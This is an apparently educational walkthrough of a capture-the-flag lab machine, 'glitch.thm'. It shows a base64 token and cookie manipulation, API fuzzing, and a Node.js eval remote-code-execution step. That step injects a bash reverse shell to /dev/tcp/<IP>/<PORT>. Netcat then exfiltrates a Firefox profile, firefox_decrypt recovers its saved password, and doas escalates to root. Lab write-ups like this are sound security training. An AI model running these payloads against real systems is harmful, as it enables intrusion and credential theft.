1) Wait about 5 minutes until the 'error 502' disappears and the page loads.

2) Open the `development tools` and open the  tag script`.

3) From the code below:

```

      function getAccess () {
        fetch ('/ api / ac ** ss')          <---------------------
          .then ((response) => response.json ())
          .then ((response) => {
            console.log (response);
          });
      }
    
```

We have endpoint to `first api`

4) We attach to the link `/api/ac ** ss` and the encoded  `token` appears:

```dGhpc **** 3RfcmVhbA ==```

5) You will immediately notice that the sequence looks familiar it is `base64`.

Go to, for example, this page: (base64decode.org/)[base64_decode]

We enter  `encoded token` and get `decoded`:

```this_is _ * _ **```

6) Go back to the `main page` and go to the` development tools`.

We go to the `Cookies` tab and see the `token` set to the value of `value`, double click on it and change the value to `decoded token`.

After all this 'refresh the page' (f5)

7) Another page appears, go to the `debugger` tab.

On the left panel, open the `js` tab and click on the` script.js` file

```
  const container = document.getElementById ('items');
  await fetch ('/api/**')                               <------------------------
    .then ((response) => response.json ())
    .then ((response) => {
      response.sins.forEach ((element) => {

```

From the above code we can see another endpoint to the `next API`.

8) We append it to our `link` and intercept the `request` with e.g. the `burp` program in my example.

9) We do `send to reapeater` and we do` send`.

If unsuccessful `remove` from` Header request`:

```
    If-None-Match: W / "a9-0aR6bAfiK / DB + ***"

```

And everything should be working by now.

10) We check what queries the API `allows`.

We change `GET` to` OPTIONS`

```OPTIONS /api/i * HTTP / 1.1```

11) We see that we can do the following in this endpoint:

```GET, HEAD, POST```

12) We check possible parameters:

```wfuzz -c -z file, /usr/share/wordlists/common.txt -X POST --hh 45 -u http://<IP>/api/i*\?FUZZ\=test```

We see an eval function that should give us a lot to think about:

```
    ReferenceError: test is not defined
    at eval (eval at router.post (/var/web/routes/api.js:25:60
```

13) We are interested in `POST`. We are looking for `NodeJs RCE eval` on the internet.

I used this site: (https://blog.appsecco.com/nodejs-and-a-simple-rce-exploit-d79001837cc6)[site]

There I have noticed the `exploit` it will use.

14) We change in `burp` parameter to `post` and add `?cmd=` and attach `exploit`:

```
    POST /api/i*?cmd=require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/<IP>/<PORT>+0>%261"') HTTP / 1.1
```

In the terminal, enter `nc -lvpn <PORT>`

And click `send`. We should have accessed the user `user`.

15) We go to the `/home/user` directory and see the `first flag`.

16) After cat the flag (`cat <file>`) we show all the files in the directory `ls -la`.

We may notice the hidden `.firefox` directory. We enter it `cd .firefox`.

We see what looks like the session directory `b5w4643p.default-release`.

17) We download to our machine: (https://github.com/unode/firefox_decrypt)[Firefox_decrypt]

We pack sessions from the server `tar -cf archive.tar ./b*`.

Using (https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/)[netcat] we send the file to our computer.

On our computer, type: `nc -l -p 1234> ./archive.tar`.

And on the server: `nc -w 3 <IP> 1234 < ./archive.tar`.

18) Then with `firefox_decrypt` we decrypt the password to the user `v0id`:

```./firefox_decrypt.py ./( PATH TO DIRECTORY) b5w4643p.default-release```


After a while it appears to us:

```

    Website: https: //glitch.thm
    Username: 'v0id'
    Password: 'love_ *'


```

19) We switch to user `v0id` with `su v0id`.

If you see: `su: must be run from a terminal`. Enter: `python3 -c 'import pty; pty.spawn("/bin/bash")'`. And then we try again.

20) With the command `doas` we increase our privileges to the user `root`.

```doas -u root  /bin/bash```

21) We go to the `/root` directory and get the `last flag`.